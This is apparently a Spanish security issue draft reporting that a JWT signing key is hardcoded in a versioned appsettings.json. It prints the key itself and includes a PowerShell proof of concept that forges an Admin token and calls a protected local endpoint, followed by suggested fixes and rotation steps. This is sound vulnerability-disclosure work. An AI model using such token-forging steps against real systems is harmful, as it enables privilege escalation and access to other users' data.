# SEC-01 — La clave de firma del JWT está en texto plano en un archivo versionado

> Copiar desde aquí hacia arriba como **título** del issue y el resto como descripción.

---

## Título
**[Security][Crítico] `Jwt:Key` hardcodeada en `appsettings.json` permite firmar tokens de Admin con acceso a cualquier hogar**

## Labels sugeridos
`security` · `secrets` · `jwt` · `prioridad: crítica`

## Descripción

La clave simétrica con la que la API firma y valida los JWT está escrita en un archivo **versionado en el repositorio**:

`backend/appsettings.json:15`
```json
"Key": "RemesaSmartSV_Clave_Dev_2026_#Segura#"
```

Toda la validación de tokens depende de que esta clave sea secreta. Con ella, cualquier persona con acceso de lectura al repositorio (o cualquier clon del repo, o cualquier copia del `zip` que se comparta) puede **fabricar un token válido con el rol que quiera** y acceder a los datos de cualquier hogar, sin conocer ninguna contraseña.

El impacto no es teórico: el token solo necesita claims `idUsuario`, `idHogar`, `Rol` e `email` con `iss=RemesaSmartSV` y `aud=RemesaSmartSVClient`, firmados con HMAC-SHA256 usando esa clave. La API los acepta tal cual (verificado: `Jwt_AlterarElRolYRefirmarConOtraClaveLanzaSecurityTokenException` demuestra que sin la clave correcta la firma se rechaza → con la clave correcta se acepta).

Además, el `docker-compose.yml` **no inyecta `Jwt__Key`**, así que el contenedor de desarrollo y cualquier despliegue que reutilice ese compose siguen usando la clave del repo.

## Impacto

- **Escalada de privilegios total e inmediata**: `Rol=Admin` + `idHogar` del objetivo → acceso a usuarios, movimientos, presupuestos, metas y tips de terceros.
- **Acceso directo a PostgreSQL** si además se leverages SEC-02 (misma clave de entorno expuesta).
- Rotación obligatoria: aunque se mueva la clave a *user-secrets*, los tokens emitidos con la clave vieja siguen siendo válidos hasta 8 h (`exp`), por lo que la rotación debe hacerse acompañada de reinicio y, si procede, del SEC-07 (vida corta).

## Pasos para reproducir

```powershell
# 1. Leer la clave del repositorio (no hace falta ningún privilegio especial)
Get-Content backend\appsettings.json | ConvertFrom-Json | % Jwt.Key
# RemesaSmartSV_Clave_Dev_2026_#Segura#
```

```powershell
# 2. Fabricar un token Admin para el hogar 1 con esa clave
$clave = "RemesaSmartSV_Clave_Dev_2026_#Segura#"
$header  = '{"alg":"HS256","typ":"JWT"}' | ForEach-Object { [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_)).TrimEnd('=').Replace('+','-').Replace('/','_') }
$payload = '{"idUsuario":"1","idHogar":"1","http://schemas.microsoft.com/ws/2008/06/identity/claims/role":"Admin","email":"admin@remesasmart.sv","iss":"RemesaSmartSV","aud":"RemesaSmartSVClient","exp":1893456000}' | ForEach-Object { [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_)).TrimEnd('=').Replace('+','-').Replace('/','_') }
$firma = [Convert]::ToBase64String((New-Object Security.Cryptography.HMACSHA256 ([Text.Encoding]::UTF8.GetBytes($clave))).ComputeHash([Text.Encoding]::UTF8.GetBytes("$header.$payload"))).TrimEnd('=').Replace('+','-').Replace('/','_')
$token  = "$header.$payload.$firma"

# 3. Usar el token con cualquier endpoint protegido
Invoke-RestMethod http://localhost:8080/api/Usuarios -Headers @{ Authorization = "Bearer $token" }
```

Alternativa sin PowerShell: https://jwt.io → pegar el token de un login real, cambiar `role`/`idHogar`, firmarlo con la clave del paso 1 y pegarlo como `Bearer`.

## Comportamiento esperado

1. El repositorio **no** contiene ninguna clave capaz de firmar tokens.
2. La clave se resuelve por entorno (`Jwt__Key` en variables de entorno / *user-secrets* en local / secret manager en CI y despliegue).
3. Si la clave falta o es demasiado corta, la aplicación **no arranca** con un error explícito (esto ya funciona: `Program.cs:44-45` lanza `InvalidOperationException`).

## Causa probable y corrección sugerida

**Causa:** el archivo de configuración base se versionó con un valor real en lugar de un placeholder. `.gitignore` protege `secrets.json`, pero `appsettings.json` es compartido por diseño; la clave de firma no debería estar ahí.

**Corrección (código):**
```jsonc
// backend/appsettings.json -> sin secreto
"Jwt": {
  "Issuer": "RemesaSmartSV",
  "Audience": "RemesaSmartSVClient",
  "Key": ""            // <- se inyecta por entorno
}
```
```bash
# Local (fuera del repo)
dotnet user-secrets set "Jwt:Key" "$(openssl rand -base64 48)"

# CI / despliegue
Jwt__Key=<secreto del secret manager>
```
```yaml
# backend/docker-compose.yml -> sin secreto hardcodeado
environment:
  - Jwt__Key=${JWT_KEY}          # .env local NO versionado
```
```csharp
// Program.cs: validar longitud mínima de la clave antes de arrancar
if (string.IsNullOrWhiteSpace(jwtKey) || Encoding.UTF8.GetByteCount(jwtKey) < 32)
    throw new InvalidOperationException("Jwt:Key debe inyectarse por entorno y tener al menos 32 bytes.");
```

**Y rotatear la clave expuesta** (imprescindible: se ha Assume-que filtrado):
1. `dotnet user-secrets set "Jwt:Key" <nueva>` en cada entorno.
2. Reiniciar la API: los tokens emitidos con la clave vieja dejan de aceptarse de inmediato.

## Prueba automatizada asociada

`backend.Tests/SeguridadTests.cs` → `Vuln_SEC01_LaClaveFirmanteDelJwtEstaEnTextoPlanoEnElAppsettingsVersionado` (falla cuando se corrige: es el detector del hallazgo).

## Entorno verificado
- `develop` · ASP.NET Core Web API .NET 8 · `Microsoft.AspNetCore.Authentication.JwtBearer` 8.0.30
- Revisión estática + 42 casos xUnit — 2026-09-27
- Casos: CP-S-35 (y CP-S-01..CP-S-08 del bloque JWT)
- Relacionado: SEC-02 (misma clase de problema, clave de BD), SEC-07 (sin revocación → el token robado vive 8 h)
